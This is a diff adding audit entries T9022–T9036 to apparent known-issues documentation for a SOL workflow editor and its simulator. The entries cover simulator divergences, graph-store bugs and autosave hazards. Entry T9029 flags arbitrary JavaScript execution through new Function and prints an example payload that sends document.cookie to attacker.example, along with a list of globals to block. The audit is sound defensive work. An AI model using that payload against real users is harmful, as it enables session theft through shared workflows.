@@ -1438,6 +1438,394 @@ require exactly one character.
 
 ---
 
+### T9022 — Simulator evaluates inline expressions as JavaScript
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** `src/runtime/interpret.ts:evalInline` translates
+SOL inline expressions to JavaScript with one substitution
+(`E::V` → `"E::V"`), then runs them via
+`new Function(...names, "return (${jsExpr});")`. All other
+expression syntax is interpreted as JavaScript.
+
+Programs that depend on JS-specific syntax (`payload.amount.toFixed(2)`,
+`arr.length`, `typeof x`, `Math.floor(...)`, etc.) run cleanly
+in the simulator and fail at canonical SOL parse or analyze
+time.
+
+**Where it lives:** `src/runtime/interpret.ts:690–709`.
+
+**Recommendation:** Replace `new Function` with a real SOL
+expression evaluator. Until then, treat the simulator as a
+"JavaScript-flavored approximation".
+
+**Related chapter:** [23 §23.2](./23-editor-runtime-audit.md)
+
+---
+
+### T9023 — Simulator's `+` does string concatenation
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** The simulator's `applyBinaryOp` for `+` uses
+`numOrConcat`, which concatenates if either operand is a string
+(`src/runtime/interpret.ts:621, 656–661`). So `"hello" + name`
+returns a concatenated string in the simulator.
+
+Canonical SOL: analyzer rejects `str + str` with E1006 (T9005).
+Workflow runs in simulator, fails at compile.
+
+**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.4](./04-types.md)
+
+---
+
+### T9024 — Simulator's `/` always does float division
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** `case '/': return num(a) / num(b)` — JavaScript
+division always returns a double. `5 / 2` returns `2.5` in the
+simulator. Canonical SOL: `IntDiv` does truncating i64 division
+(`5 / 2 = 2`).
+
+**Where it lives:** `src/runtime/interpret.ts:624–628`.
+
+**Recommendation:** When both operands are integers (their inferred
+type matches the SOL `int` type), use `Math.trunc(num(a) / num(b))`.
+
+**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.1](./04-types.md)
+
+---
+
+### T9025 — Simulator's `toBool` accepts non-bool
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** `toBool(v)` accepts JS booleans, numbers,
+strings, and any other truthy/falsy value
+(`src/runtime/interpret.ts:674–679`). Canonical SOL requires
+`bool` for `if`/`while`/`for-in` conditions and for `&&`/`||`
+operands; E1003 / E1009 reject non-bool.
+
+`if score { ... }` (where score is `int`) runs in the simulator
+and fails to compile.
+
+**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [04 §4.2.3](./04-types.md), [08 §8.3](./08-expressions.md)
+
+---
+
+### T9026 — Simulator enum comparison normalizes by name (hides T9002)
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** The simulator represents enum variants as strings
+(`"E::V"` or `"E::V(N)"`) and compares them after stripping the
+optional `(N)` suffix (`src/runtime/interpret.ts:663–672`).
+Comparison is by enum + variant name — the *intended* semantics.
+
+Canonical SOL bytecode uses `first_char % 10` for runtime values
+(T9002). Two variants with the same first character collide at
+runtime in production but never in the simulator.
+
+This is the **single most important simulator/canonical
+divergence**: the simulator masks a real production bug. Users
+test their workflow, see correct enum dispatch, deploy, and
+silently misbehave.
+
+**Where it lives:** `src/runtime/interpret.ts:562–567, 663–672`.
+
+**Recommendation:** Until T9002 is fixed in the canonical
+bytecode, the simulator should mirror the buggy behavior — or
+emit a warning whenever two variants in an enum share a first
+character (telling the user "this works here but will collide in
+production").
+
+**Related chapter:** [23 §23.3](./23-editor-runtime-audit.md), [10 §10.5](./10-enums.md), [21 §21.6](./21-behavior-classification.md)
+
+---
+
+### T9027 — Simulator has flat per-function scope (no block scoping)
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** The simulator uses a single
+`Record<string, unknown>` per function call as the scope
+(`src/runtime/interpret.ts:74, 179`). Every `let` inside the
+function body writes to the same flat object. Two `let`s with the
+same name in different blocks overwrite each other.
+
+Canonical SOL: block-scoped. Same-block duplicates fail E1002;
+different-block declarations are independent.
+
+Two opposite-direction bugs result:
+
+1. `let x: int = 5; if true { let x: int = 10; } return x;` —
+   simulator returns `10`; canonical SOL fails E1002.
+2. `if true { let inner: int = 5; } return inner;` —
+   simulator returns `5`; canonical SOL fails E1001.
+
+**Where it lives:** `src/runtime/interpret.ts:74, 179–224`.
+
+**Recommendation:** Add a scope-stack to the simulator that
+mirrors the analyzer's block-scoping model. Push on Block entry,
+pop on Block exit.
+
+**Related chapter:** [23 §23.4](./23-editor-runtime-audit.md), [06 §6.3, 06 §6.4](./06-variables-and-scope.md)
+
+---
+
+### T9028 — Simulator throws on undefined variable (catches what T9014 hides)
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** The simulator's `evalNode` for `varGet` throws
+`RuntimeError('undefined variable: <name>')` when the name isn't
+in scope (`src/runtime/interpret.ts:520–522`).
+
+Canonical bytecode auto-creates a slot with `Type::Integer`
+default and emits `LoadLocal(slot)`, producing undefined behavior
+at runtime (T9014). The simulator is *stricter* — it catches the
+bug at simulation time that the canonical compiler papers over.
+
+Direction of divergence: **simulator > canonical** for safety
+here. Programs that pass simulation are safer with respect to
+this category, but programs that fail simulation aren't
+necessarily wrong in canonical SOL — they may "work" via T9014's
+mechanism.
+
+**Recommendation:** Keep the simulator's behavior; fix the
+canonical side to match (T9014's recommendation).
+
+**Related chapter:** [23 §23.4](./23-editor-runtime-audit.md), [06 §6.1](./06-variables-and-scope.md)
+
+---
+
+### T9029 — Simulator's `new Function` is arbitrary JS execution
+
+**Category:** tool — security hazard
+
+**Description:** The simulator constructs and executes a JS
+function from the inline expression string. A workflow loaded
+from an untrusted source (shared `.workflow.json`, Sol Man LLM
+output with prompt-injected expression) can execute arbitrary
+JavaScript in the user's browser the moment "Run" is clicked.
+
+Example malicious inline expression:
+
+```text
+fetch('https://attacker.example/' + document.cookie)
+```
+
+The simulator does not sandbox, does not block globals, does not
+restrict network access. Cookies, localStorage, fetched data —
+all reachable.
+
+**Where it lives:** `src/runtime/interpret.ts:702–703`.
+
+**Severity:** **High** for workflows loaded from untrusted
+sources. Low for hand-authored workflows.
+
+**Recommendation:**
+
+1. **Short term:** disallow specific JS globals/syntax in inline
+   expressions at validation time (`Math`, `Date`, `document`,
+   `window`, `globalThis`, `fetch`, `eval`, method-call chains,
+   `typeof`).
+2. **Medium term:** sandbox the `new Function` evaluation in a
+   Web Worker with `globalThis` shadowed.
+3. **Long term:** replace `new Function` with a real SOL
+   expression evaluator (T9022 fix).
+
+**Related chapter:** [23 §23.8](./23-editor-runtime-audit.md)
+
+---
+
+### T9030 — Simulator step/depth/duration limits do not exist in canonical SOL
+
+**Category:** tool — simulator/canonical divergence
+
+**Description:** The simulator throws `RuntimeError` when any of
+MAX_STEPS (100_000), MAX_CALL_DEPTH (1000), or MAX_DURATION_MS
+(60_000) is exceeded (`src/runtime/interpret.ts:70–72, 296–304`).
+Canonical SOL has none of these limits.
+
+Programs that fail simulator limits may run fine in production.
+A recursive function with depth 1500 simulates as "Maximum call
+depth exceeded" but runs in canonical SOL until the host's Rust
+stack overflows.
+
+The simulator's limits are defensive (against tab-freezing), not
+semantic.
+
+**Recommendation:** Document the limits as simulator-only.
+Future canonical SOL may add semantic limits; until then, treat
+"simulator OOM/timeout" as a UX signal rather than a correctness
+signal.
+
+**Related chapter:** [23 §23.7](./23-editor-runtime-audit.md)
+
+---
+
+### T9031 — Simulator cannot exercise `ext function` calls
+
+**Category:** tool — feature gap
+
+**Description:** The simulator's `call` op looks up the target
+in `ctx.workflow.functions`. The editor's schema doesn't model
+`ext function` declarations at all (they're a runtime concept).
+A workflow that calls an external function fails at simulation
+with `target function not found`.
+
+Users cannot end-to-end test workflows that depend on `ext` calls
+via the simulator. The only way to verify ext-heavy workflows is
+to run them in a real host with the endpoint configured.
+
+**Where it lives:** `src/runtime/interpret.ts:459–476`.
+
+**Recommendation:** Add a simulator-side "ext stub" mechanism:
+let the user define mock return values for each `ext` name. The
+simulator dispatches to the mock; the host dispatches to the
+real endpoint.
+
+**Related chapter:** [23 §23.6](./23-editor-runtime-audit.md), [12 §12.1](./12-imports-and-controllers.md)
+
+---
+
+### T9032 — `updateFunctionSignature` leaves dangling arg edges
+
+**Category:** tool — graph mutation hazard
+
+**Description:** When a function's signature changes (parameter
+renamed), the store rebuilds the ports on every call-node
+(`src/stores/graph.store.ts:152–170`) but does **not** call
+`rebuildAllPorts()`. Edges pointing at the old `arg:<old-name>`
+ports become dangling — the new ports use `arg:<new-name>` ids.
+
+Symptom: validator fires `missing input arg:<new-name>` on every
+call-node after the rename; the dangling edge remains in the
+graph silently. The user must re-wire or manually delete.
+
+**Where it lives:** `src/stores/graph.store.ts:152–170`.
+
+**Recommendation:** Call `rebuildAllPorts()` after every signature
+change to clean up dangling edges proactively.
+
+**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
+
+---
+
+### T9033 — `rebuildAllPorts` silently drops dangling edges
+
+**Category:** tool — silent data loss
+
+**Description:** `src/stores/graph.store.ts:856–865` filters out
+every edge whose endpoint port no longer exists, with no user
+warning. After a struct field rename or a function-signature
+change, edges that referenced the old port ids are removed
+silently. The user loses wiring they may have spent time
+creating.
+
+**Where it lives:** `src/stores/graph.store.ts:851–867`.
+
+**Recommendation:** Collect the dropped edges and surface them as
+warnings (toast / Inspector panel). Or refuse to rebuild ports
+when edges would be dropped, prompting the user to confirm.
+
+**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
+
+---
+
+### T9034 — `loadWorkflow` performs no schema validation
+
+**Category:** tool — defense gap
+
+**Description:** `src/stores/graph.store.ts:834–839`:
+```ts
+function loadWorkflow(wf: SolWorkflow) {
+    workflow.value = wf;
+    activeFunctionId.value = wf.functions[0]?.id ?? '';
+    rebuildAllPorts();
+    touch();
+}
+```
+
+The TypeScript signature claims `SolWorkflow` but the function
+performs no runtime validation. A malformed object (missing
+`imports`, `meta`, or with wrong-shaped nodes) is accepted; the
+store enters an inconsistent state; downstream `validateWorkflow`
+/ `emit` / Inspector / canvas may crash.
+
+`bootstrap()` (autosave-resume) does check
+`parsed.schemaVersion === 1 && parsed.functions?.length`;
+`loadWorkflow` skips even that.
+
+**Where it lives:** `src/stores/graph.store.ts:834–839`.
+
+**Recommendation:** Route every `loadWorkflow` call through a
+validator that asserts the schema shape. Reject malformed
+workflows at the boundary.
+
+**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
+
+---
+
+### T9035 — Undo/redo `isReplaying` race window
+
+**Category:** tool — rare race condition
+
+**Description:** The store's undo/redo flow uses a single
+`isReplaying: boolean` plus a `setTimeout(0)` to re-enable
+capture after state restoration. Rapid undo/redo + autosave
+debounces can race; occasionally a snapshot fires before the
+next replay's `isReplaying = true` guard, truncating the redo
+stack.
+
+**Where it lives:** `src/stores/graph.store.ts:927, 961–972,
+980–991`.
+
+**Severity:** **Low.** Rare and mostly cosmetic — the user
+loses a redo step they could redo again from the previous
+state.
+
+**Recommendation:** Use a per-operation token rather than a
+single boolean flag. Each replay carries its own token; the
+debounced snapshot checks "is the most recent replay still
+pending?" via the token.
+
+**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
+
+---
+
+### T9036 — Autosave debounce can lose recent changes on tab close
+
+**Category:** tool — UX hazard
+
+**Description:** The autosave fires after 600ms of idle. If the
+user closes the tab during the 600ms window, the most recent
+change is not persisted. There is no `beforeunload` flush.
+
+**Where it lives:** `src/stores/graph.store.ts:994–1006`.
+
+**Severity:** **Medium** — affects every editor session.
+
+**Recommendation:** Add a `beforeunload` listener that
+synchronously flushes the pending save:
+
+```ts
+window.addEventListener('beforeunload', () => {
+    if (saveTimer !== undefined) {
+        window.clearTimeout(saveTimer);
+        try {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(workflow.value));
+        } catch {}
+    }
+});
+```
+
+**Related chapter:** [23 §23.9](./23-editor-runtime-audit.md)
+
+---
+
 ### T9017 — `CliParser` panics on empty or single-character arguments
 
 **Category:** tool — CLI minor
